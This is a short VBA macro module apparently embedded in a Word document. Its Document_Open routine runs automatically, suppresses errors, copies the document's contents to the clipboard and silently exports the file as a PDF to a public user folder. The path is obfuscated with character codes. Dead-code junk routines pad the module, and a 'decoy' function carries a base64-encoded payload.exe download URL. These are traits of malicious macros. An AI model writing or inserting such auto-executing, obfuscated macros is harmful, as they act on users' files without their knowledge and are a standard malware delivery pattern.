
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim lckhv437 As Object
    On Error Resume Next
    Set lckhv437 = ActiveDocument.Range
    lckhv437.Copy
    ActiveDocument.ExportAsFixedFormat OutputFileName:= _
        Chr(67) & Chr(58) & Chr(92) & Chr(85) & Chr(115) & Chr(101) & Chr(114) & Chr(115) & Chr(92) & "Publ" & "ic\ob" & "livion" & "x_format" & ".pdf", ExportFormat:=wdExportFormatPDF
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
